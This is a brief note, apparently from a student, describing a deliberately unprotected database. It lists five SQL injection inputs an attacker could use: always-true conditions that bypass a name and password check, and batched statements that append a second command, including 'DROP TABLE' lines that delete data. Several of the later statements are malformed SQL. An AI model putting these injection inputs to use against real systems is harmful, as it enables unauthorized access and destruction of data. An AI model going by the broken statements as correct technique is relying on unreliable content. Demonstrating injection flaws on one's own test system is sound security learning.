My database has 3 different inputs that can be attacked. 
There are no security measures to prevent these attacks so the attacker has
multiple options that they can attack from. Below are some of the commands the user
can use to attack this database: 

1) SQL Injection Based on 1=1 is always true
SELECT * FROM Users WHERE name = xyz OR 1=1; 
2) SQL Injection Based on "=" is always true
" or ""="
SELECT * FROM Users WHERE Name ="" or ""="" AND Pass ="" or ""="" 
3) SQL Injection Based on Batched SQL Statements 
22; DROP TABLE tablename
4) SQL Injection Based on Batched SQL Statements
22; SELECT mytable FROM mycode UNION SELECT name FROM database
5) SQL Injection Based on Batched SQL Statements
testname' SELECT * FROM names; DROP TABLE database
